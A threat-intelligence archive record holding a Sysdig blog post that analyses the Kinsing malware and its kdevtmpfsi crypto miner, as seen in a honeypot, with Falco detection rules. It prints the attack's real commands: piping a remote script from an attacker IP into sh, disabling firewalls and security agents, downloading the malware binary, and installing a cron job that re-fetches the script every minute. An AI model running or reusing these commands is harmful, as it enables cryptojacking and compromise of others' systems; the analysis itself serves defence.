{
    "id": "17a0fc7e-c767-493a-b22f-db6437ea2e90",
    "created_at": "2023-01-12T15:06:32.085695Z",
    "updated_at": "2025-03-27T02:17:01.071158Z",
    "deleted_at": null,
    "sha1_hash": "c59a9712231310a14b27efe4a03041ca31f67049",
    "title": "2020-11-23 - Zoom into Kinsing",
    "authors": "",
    "file_creation_date": "2022-08-18T03:26:35Z",
    "file_modification_date": "2022-08-18T03:26:35Z",
    "file_size": 1624224,
    "plain_text": "# Zoom into Kinsing\n\n**sysdig.com/blog/zoom-into-kinsing-kdevtmpfsi/**\n\nBy Kaizhe Huang November 23, 2020\n\nThe Kinsing attack has recently been reported by security researchers, and it is well known\nfor targeting misconfigured cloud native environments. It is also known for its comprehensive\n[attack patterns, as well as defense evasion schemes.](https://sysdig.com/blog/mitre-defense-evasion-falco/)\n\nA misconfigured host or cluster could be exploited to run any container desired by the\n[attacker. That would cause outages on your service or be used to perform lateral movement](https://sysdig.com/blog/lateral-movement-cloud-containers/)\nto other services, compromising your data.\n\nIn this blog, we are going to dive into the attack patterns of Kinsing. The better we\nunderstand this attack, the better we can defend our cloud native environment.\n\n## Starting point\n\nAccording to [Shodan, a search engine for internet-connected devices, more than 2,000](https://www.shodan.io/)\nDocker engines were exposed to the internet. Some of those Docker engines weren’t\n**configured with authentication, which make them a perfect target for Kinsing attacks.**\n\nIn our honeypot project, we noticed that a latest version of the Ubuntu container was created\nwithout any privileged setting. It looked like a normal container running. However, we noticed\nthe entrypoint of the image, as it was a little bit suspicious.\n\n\n-----\n\n```\n/bin/bash capt get update && apt get install y wget cron;service cron start; wget q\n-O - 45.10.88.124/d.sh | sh;tail -f /dev/null\n\n```\nWhat grabbed our attention was:\n\n1. The code ran `apt-get inside a running container. This is not a normal behavior since`\n\nall of your packages’ installation/update should be done earlier, only once, when\nbuilding the image.\n2. Starting cron services inside a running container is also abnormal. You should run\n\n[periodic tasks at the orchestrator level, using CronJob or](https://kubernetes.io/docs/concepts/workloads/controllers/cron-jobs/) [Jobs.](https://kubernetes.io/docs/concepts/workloads/controllers/job/)\n3. Downloading a shell script from an unknown IP address also looks suspicious. A\n\nwhois lookup located the IP in a Eastern European country. Also note that most of your\nservices don’t need egress traffic to the internet.\n4. The code ran `tail -f /dev/null in order to keep the container running.`\n\nUpon closer inspection, it looks like the downloaded d.sh is the malicious script that kicks off\nthe Kinsing attacks. After the script is downloaded, it is executed to do the following:\n\n1) Prepare for running malware by increasing the fd limit, removing syslog, and changing\nfile/directories’ permission.\n```\nulimit -n 65535\n\nrm -rf /var/log/syslog\n\nchattr -iua /tmp/\n\nchattr -iua /var/tmp/\n\nchattr -R -i /var/spool/cron\n\nchattr -i /etc/crontab\n\n```\n2) Turn off security services (comments were added to explain the commands):\n\n\n-----\n\n```\n# Disable firewall\n\nufw disable\n\n# Remove iptable rules\n\niptables -F\n\n# Stop NMI hard lock detector so that no hardware instruction interruption is\nfeasible\n\nsudo sysctl kernel.nmi_watchdog=0\n\necho '0' >/proc/sys/kernel/nmi_watchdog\n\necho 'kernel.nmi_watchdog=0' >>/etc/sysctl.conf\n\n# Stop apparmor\n\nservice apparmor stop\n\nsystemctl disable apparmor\n\n# Stop SELinux\n\nsetenforce 0\n\necho SELINUX=disabled >/etc/selinux/config\n\n# Stop security service from Ali Cloud\n\ncurl http://update.aegis.aliyun.com/download/uninstall.sh | bash\n\ncurl http://update.aegis.aliyun.com/download/quartz_uninstall.sh | bash\n\npkill aliyun-service\n\nrm -rf /etc/init.d/agentwatch /usr/sbin/aliyun-service\n\nrm -rf /usr/local/aegis*\n\nsystemctl stop aliyun.service\n\nsystemctl disable aliyun.service\n\nservice bcm-agent stop\n\nyum remove bcm-agent -y\n\napt-get remove bcm-agent -y\n\n```\n3) Kill other crypto mining processes and their cronjobs:\n```\nps auxf | grep -v grep | grep \"mine.moneropool.com\" | awk '{print $2}' | xargs -I %\nkill -9 %\n\nps auxf | grep -v grep | grep \"pool.t00ls.ru\" | awk '{print $2}' | xargs -I % kill -9\n%\n\nps auxf | grep -v grep | grep \"xmr.crypto-pool.fr:8080\" | awk '{print $2}' | xargs -I\n% kill -9 %\n\nps auxf | grep -v grep | grep \"xmr.crypto-pool.fr:3333\" | awk '{print $2}' | xargs -I\n% kill -9 %\n\npkill -f cryptonight\n\npkill -f sustes\n\npkill -f xmrig\n\npkill -f xmrig-cpu\n\ncrontab -l | sed '/xmr.ipzse.com/d' | crontab \ncrontab -l | sed '/185.181.10.234/d' | crontab \ncrontab -l | sed '/146.71.79.230/d' | crontab \ncrontab -l | sed '/122.51.164.83/d' | crontab \n```\n4) Delete files related to crypto mining:\n```\nrm -rf /var/tmp/2.sh\n\nrm -rf /var/tmp/config.json\n\nrm -rf /var/tmp/xmrig\n\nrm -rf /var/tmp/1.so\n\n```\n\n-----\n\n5) Download the Kinsing malware and run the following:\n```\n# This is the first download\n\n$WGET $DIR/kinsing https://bitbucket.org/tromdiga1/git/raw/master/kinsing\n\nchmod +x $DIR/kinsing\n\n# Try downloading from a different source if the first one failed\n\n$WGET $DIR/kinsing http://45.10.88.124/kinsing\n\nchmod +x $DIR/kinsing\n\n# Run the command\n\nSKL=d $DIR/kinsing\n\n```\n1. Create a cronjob to download the malicious script:\n```\n   crontab -l | grep -e \"195.3.146.118\" | grep -v grep\n\n   if [ $? -eq 0 ]; then\n\n    echo \"cron good\"\n\n   else\n\n    (\n\n     crontab -l 2>/dev/null\n\n     # $LDR is either wget or curl\n\n     echo \"* * * * * $LDR http://195.3.146.118/d.sh | sh > /dev/null 2>&1\"\n\n    ) | crontab \n   fi\n\n```\nIt looks like after executing d.sh, our system would be a mess, and kinsing will be running.\n\n[Let’s dig into what Kinsing actually does with Sysdig open source.](https://github.com/draios/sysdig)\n\n## Kinsing the malware\n\nAs a security researcher reported, Kinsing is written in Golang, a high level programming\nlanguage for cloud native application development. It’s compiled with Go 1.13.6, which is a\nfairly new version. When Kinsing was running in our honeypot project, I got a chance to take\na closer look at it. I used Sysdig open source to analyze the syscalls that executed from\n_Kinsing._\n\nIn summary, Kinsing serves as a convoy to a crypto miner. While successfully running inside\nthe victim’s environment, it laterally moves into other machines.\n\n### Kinsing creates a crypto miner\n\n_Kdevtmpfsi is the crypto miner that will be created and run by Kinsing in the /tmp directory._\nGiven their sizes, it looks like that the crypto miner is baked into Kinsing:\n```\n3.7M Oct 20 22:13 kdevtmpfsi\n\n16M Jul 26 10:29 kinsing\n\n```\nFrom the system calls, we have more clarity into how the file is created:\n\n\n-----\n\nBy using the open-source Sysdig Inspect, Kinsing wrote to a file called `/tmp/kdevtmpfsi .`\nAfter creating the file, it added permissions to execute.\n\nFinally, the binary will be executed:\n\nOnce the crypto miner is running, Kinsing constantly checks the miner status through reading\nthe process status file:\n\n\n-----\n\n[It is also reflected in the source code, that you can reverse engineer with redress:](https://github.com/goretk/redress)\n```\nFile: main.go\n\n     init Lines: 29 to 30 (1)\n\n     init0 Lines: 63 to 75 (12)\n\n     main Lines: 75 to 213 (138)\n\n     mainfunc1 Lines: 139 to 403 (264)\n\n     healthChecker Lines: 213 to 237 (24)\n\n     minerRunningCheck Lines: 237 to 271 (34)\n\n     isMinerRunning Lines: 271 to 300 (29)\n\n     minRun Lines: 300 to 398 (98)\n\n```\nInside the main function, there is a function `isMinerRunning that checks the status of the`\nminer. That way, if kdevtmpfsi is killed, Kinsing will restart the miner program.\n\n### Kinsing communicates with a C2 server\n\nLike some other malwares, Kinsing did contact Command and Control (C2) servers. The\nHTTP requests sent to the following URL paths and request methods were captured by\nSysdig open-source:\n\nURL Path HTTP Method\n\n\n-----\n\n/get GET\n\n/o POST\n\n/mg GET\n\n/h GET\n\nEach request returns a few strange characters.\n\nOne request worth highlighting above is the one to “/get” in the C2 server. Right after this\nrequest, the Kinsing malware started to download shell scripts from another server. Below\nare the three scripts that were downloaded via HTTP requests:\n\nal.sh\ncron.sh\nspre.sh\n\n_al.sh and cron.sh just repeated the tasks that were done earlier: stop the security_\nmechanism, kill other mining processes, delete other crypto mining cronjob, and add\n_Kinsing’s own cronjob._\n\nThe spre.sh, was used to lateral move to other machines through reading the SSH keys on\nthe victims file system (e.g., files like “~/.ssh/config”, “~/.bash_history”).\n\n\n-----\n\n## Kdevtmpfsi the crypto miner\n\nA crypto-mining attack is just like free riding on Wi-Fi.\n\nJust as your network bandwidth will be shared by the free rider, some (or most) of your CPU\nor computing resources will be occupied by the mining processes without your consent. The\nimpact is also similar. If the Wi-Fi free rider is downloading movies via BitTorrent using your\nWi-Fi network, you may have a poor experience while watching Netflix.\n\nWhen there is a mining process running, other applications running in the same node will be\nseverely impacted since the mining process may occupy the CPU most of the time. Cryptomining attacks have become one of the most appealing attacks to hackers, as it is an almost\nguaranteed way of gaining some benefits out of a successful intrusion. In this section, we will\nbe looking into a few patterns of the crypto miner kdevtmpfsi.\n\n### CPU Usage\n\nMost of the crypto miners occupy a lot of CPU cycles, and kdevtmpfsi is no different. The\nCPU usage goes up when kdevtmpfsi started to run:\n\n\n-----\n\nAs you can see, kdevtmpfsi occupied almost half of the computing power of the node.\n\nIn production, DevOps may find that some services occupy a lot of CPU cycles because of\nsoftware flaws or overloaded requests. It still doesn’t suggest every CPU hike is caused by\ncrypto miners. However, if CPU hikes are caused by some unknown processes or unknown\ncontainers, you should pay more attention to the hike.\n\n### How kdevtmpfsi prepares to mine\n\nAlthough we followed (and you should too) the best practices to assign resource limits and\nrequests for each workload, most of the containerized microservices don’t really care\nwhether the worker node is 8, 16, or 32 cores CPU. They will be scheduled to run by the\nkube-scheduler based on the request, as well as the worker node’s resource capacity.\n\nBack to kdevtmpfsi. Below is a list of the system files accessed before the miner contacted\nthe miner pool:\n\nFile name What is the file about?\n\n`/sys/devices/system/cpu/online` To know how many CPUs are online\nand being scheduled (e.g., 0-7\nindicates there is an 8 cores CPU)\n\n`/proc/cpuinfo` Displays what type of processor your\nsystem is running, including the\nnumber of CPUs present.\n\n\n-----\n\n`/proc/mounts` A symlink to self/mounts which\ncontains a list of the currently\nmounted devices and their mount\npoints.\n\n`/proc/self/cgroup` Cgroup information about the caller\nprocess.\n\n`/sys/bus/cpu/devices/cpu*/online` CPUs that are online and being\nscheduled.\n\n`/sys/bus/cpu/devices/cpu*/topology/*` CPU topology files that describe a\nlogical CPU’s relationship to other\ncores and threads in the same\nphysical package.\n\n`/sys/bus/cpu/devices/cpu*/cache/index*/*` Parameters for the CPU cache\nattributes.\n\n`/sys/kernel/mm/hugepages/*` Contains files and information on\nhugepages, where pagesize could be\n1048576 or 2048, corresponding to\n1GB or 2MB of hugepage size.\n\n`/sys/bus/node/devices/node*/cpumap` The node’s cpumap.\n\n`/sys/bus/node/devices/node*/meminfo` Provides information about the\nnode’s distribution and memory\nutilization. Similar to /proc/meminfo.\n\n`sys/bus/node/devices/node*/hugepages` The node’s huge page size\ncontrol/query attributes.\n\n`/sys/devices/virtual/dmi/*` Contains hardware information. It\nmay also contain cloud service\ninformation (e.g., ec2, t2.xlarge).\n\nAs you can guess, kdevtmpfsi gathers the system information, like CPU, memory, cgroup,\netc., to prepare for the mining.\n\n### How kdevtmpfsi communicates with the miner pool\n\nLike most other crypto miners, kdevtmpfsi also contacts a miner pool. It does so by using\nJSON-RPC over HTTP.\n\nFirst, kdevtmpfsi sends an login request to the miner pool server:\n\n\n-----\n\n```\ndata { id :1, jsonrpc : 2.0, method : login, params :\n{\"login\":\"42J8CF9sQoP9pMbvtcLgTxdA2KN4ZMUVWJk6HJDWzixDLmU2Ar47PUNS5XHv4Kmfdh8aA9fbZmKH\n (Linux x86_64) libuv/1.8.0 gcc/5.4.0\",\"algo\":\n[\"cn/1\",\"cn/2\",\"cn/r\",\"cn/fast\",\"cn/half\",\"cn/xao\",\"cn/rto\",\"cn/rwz\",\"cn/zls\",\"cn/doub\nlite/1\",\"cn-heavy/0\",\"cn-heavy/tube\",\"cn-heavy/xhv\",\"cn-pico\",\"cnpico/tlo\",\"rx/0\",\"rx/wow\",\"rx/loki\",\"rx/arq\",\"rx/sfx\",\"argon2/chukwa\",\"argon2/wrkz\"]}}\n\n```\nFrom the login request, we know that the miner actually mines for Monero(XMR). And the\nlogin request includes a login ID, password, agent, and supported mining algorithms.\n\nOnce the login has been confirmed, the following response is returned:\n```\ndata={\"jsonrpc\":\"2.0\",\"id\":1,\"error\":null,\"result\":{\"id\":\"768395e4-6b12-4354-82d612d16884fd5c\",\"job\":\n{\"blob\":\"0e0e9ccce1fc0562c6ecba81af5cb891de8765b67096b4ca647b9be3902fc904cf2603b2a0bf5\n[\"algo\",\"nicehash\",\"connect\",\"tls\",\"keepalive\"],\"status\":\"OK\"}}\n\n```\n_Kdevtmpfsi received the mining job immediately for the negotiated mining algorithm, as well_\nas the scheme to communicate.\n\n_Kdevtmpfsi received four more jobs later on:_\n\n**Job ID: 703276738178843**\n```\ndata={\"jsonrpc\":\"2.0\",\"method\":\"job\",\"params\":\n{\"blob\":\"0e0e99cde1fc05abffc0dcb55a5309a31f147fc02172c2469d2ffdaf98147e85c732a71393ef6\n\n```\n**Job ID: 508335469096263**\n```\ndata={\"jsonrpc\":\"2.0\",\"method\":\"job\",\"params\":\n{\"blob\":\"0e0eb5cde1fc0598f9fab009bfdf7ab22fc588690f604e30f4b2c93c6308d76cd1a08482e6e7c\n\n```\n**Job ID: 704899485008265**\n```\ndata={\"jsonrpc\":\"2.0\",\"method\":\"job\",\"params\":\n{\"blob\":\"0e0ea8cde1fc0598f9fab009bfdf7ab22fc588690f604e30f4b2c93c6308d76cd1a08482e6e7c\n\n```\n**Job ID: 325604739614457**\n```\ndata={\"jsonrpc\":\"2.0\",\"method\":\"job\",\"params\":\n{\"blob\":\"0e0edecde1fc0598f9fab009bfdf7ab22fc588690f604e30f4b2c93c6308d76cd1a08482e6e7c\n\n```\nEach job used the same algorithm as negotiated before, with the same seed hash value but\na different blob value.\n\nLater on, kdevtmpfsi managed to send a heartbeat-like message to the miner pool with a\nspecial method called `keepalived :`\n```\ndata={\"id\":4,\"jsonrpc\":\"2.0\",\"method\":\"keepalived\",\"params\":{\"id\":\"768395e4-6b124354-82d6-12d16884fd5c\"}}\n\n```\n\n-----\n\nAnd the miner pool server returned with a nod message:\n```\ndata={\"id\":2,\"jsonrpc\":\"2.0\",\"error\":null,\"result\":{\"status\":\"KEEPALIVED\"}}\n\n```\nThe heartbeat message was sent about every minute. These communication patterns\nrepeated while the miner was running.\n\n## Mitigation strategies for Kinsing\n\nBefore we talk about the mitigation strategies, let’s recap what suspicious attack patterns\nwere discovered from Kinsing.\n\n### Quick recap\n\nIt would make sense to divide patterns found from Kinsing into three categories: process, file\nand network.\n\nAnd the division helps identify potential IOCs from three different angles:\n\n**Suspicious process activities:**\n\nLaunch package management tool to download toolkits facilitating attacks, like\napt-get.\nEnable a cronjob service inside a container.\nDisable security services, like firewall, AppArmor, and cloud agents (from a\ncontainer).\nA process launched from suspicious directories, like /tmp and /var/tmp.\nUnknown processes occupied a lot of CPU cycle.\nKill a bunch of processes, though the process may not exist.\n**Suspicious file activities:**\n\nRemove a bunch of files, though the file may not exist.\nAdd execution permission to files newly created (should be configured inside\nDockerfile).\nRead system and device information.\nRead files that may contain secret information (e.g., “~/.ssh/config”,\n“~/.bash_history”).\nLook for specific sensitive string patterns, like “id_rsa” from files.\nUpdate cronjob, though cronjob may not be used.\n**Suspicious network activities:**\n\nNetwork traffic to the C2 server and miner pool.\nHTTP request contains suspicious URL path (e.g., /o, /mg, /al.sh, /spre.sh).\nHeartbeat messages that emit to suspicious IP addresses.\n\n\n-----\n\nAlthough we can t rely on a single individual suspicious event to unveil the Kinsing attack\ncompletely, some of the patterns above are significant enough to draw the SOC team’s\nattention. So let’s talk about how Falco can help detect such an attack.\n\n### Falco\n\nFalco, a CNCF incubating project, can help detect any anomalous activities in cloud native\nenvironments with rich, out-of-the-box default rules. Below are a few worth highlighting to\ndetect suspicious behavior mentioned previously\n```\n# Container is supposed to be immutable. Package management should be done in\nbuilding the image.\n\n- rule: Launch Package Management Process in Container\n\n desc: Package management process ran inside container\n\n- rule: Outbound Connection to C2 Servers\n\n desc: Detect outbound connection to command & control servers\n\n- rule: Container Drift Detected (chmod)\n\n desc: New executable created in a container due to chmod\n\n- rule: Search Private Keys or Passwords\n\n desc: Detect grep private keys or passwords activity.\n\n- rule: Detect outbound connections to common miner pool ports\n\n desc: Miners typically connect to miner pools on common ports.\n\n```\n[You can find the full list of Falco rules here.](https://github.com/falcosecurity/falco/tree/master/rules)\n\n## Conclusion\n\nKinsing malware showed comprehensive patterns during the attack.\n\nWithout a deep insight into the process activities, file activities, and network activities from\nyour cloud native environment, and the help from a smart detection engine, it will be hard to\ndetect such an attack. It will be even more difficult to uncover it.\n\nIt is also important to note that a unified monitoring and secure platform will speed up the\ninvestigation process. Once you identify a single suspicious event, it helps you trace down\nthe event from different angles: resource usage, network connections, and reading sensitive\nfiles.\n\nSuccessfully correlating these events together (e.g., using parent/grandparent process ID)\nwill unveil the kinsing attack.\n\n_The_ _[Sysdig Secure DevOps Platform combines monitoring and securing solutions so you](https://sysdig.com/platform-architecture/)_\n_can easily correlate events and protect your cloud native environment in a way that wouldn’t_\n_[be possible otherwise. Try it today!](https://sysdig.com/company/free-trial/)_\n\n\n-----\n\n## Zero Trust Network Security for Containers and Kubernetes\n\nWatch On-Demand\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2020/2020-11-23 - Zoom into Kinsing.pdf"
    ],
    "report_names": [
        "2020-11-23 - Zoom into Kinsing.pdf"
    ],
    "threat_actors": [
        {
            "id": "eb3f4e4d-2573-494d-9739-1be5141cf7b2",
            "created_at": "2022-10-25T16:07:24.471018Z",
            "updated_at": "2025-03-27T02:02:10.24394Z",
            "deleted_at": null,
            "main_name": "Cron",
            "aliases": [],
            "source_name": "ETDA:Cron",
            "tools": [
                "Catelites",
                "Catelites Bot",
                "CronBot",
                "TinyZBot"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "a6c351ea-01f1-4c9b-af75-cfbb3b269ed3",
            "created_at": "2023-01-06T13:46:39.390649Z",
            "updated_at": "2025-03-27T02:00:03.072899Z",
            "deleted_at": null,
            "main_name": "Kinsing",
            "aliases": [
                "Money Libra"
            ],
            "source_name": "MISPGALAXY:Kinsing",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "f9806b99-e392-46f1-9c13-885e376b239f",
            "created_at": "2023-01-06T13:46:39.431871Z",
            "updated_at": "2025-03-27T02:00:03.08926Z",
            "deleted_at": null,
            "main_name": "Watchdog",
            "aliases": [
                "Thief Libra"
            ],
            "source_name": "MISPGALAXY:Watchdog",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        }
    ],
    "ts_created_at": 1673535992,
    "ts_updated_at": 1743041821,
    "ts_creation_date": 1660793195,
    "ts_modification_date": 1660793195,
    "files": {
        "pdf": "https://archive.orkl.eu/c59a9712231310a14b27efe4a03041ca31f67049.pdf",
        "text": "https://archive.orkl.eu/c59a9712231310a14b27efe4a03041ca31f67049.txt",
        "img": "https://archive.orkl.eu/c59a9712231310a14b27efe4a03041ca31f67049.jpg"
    }
}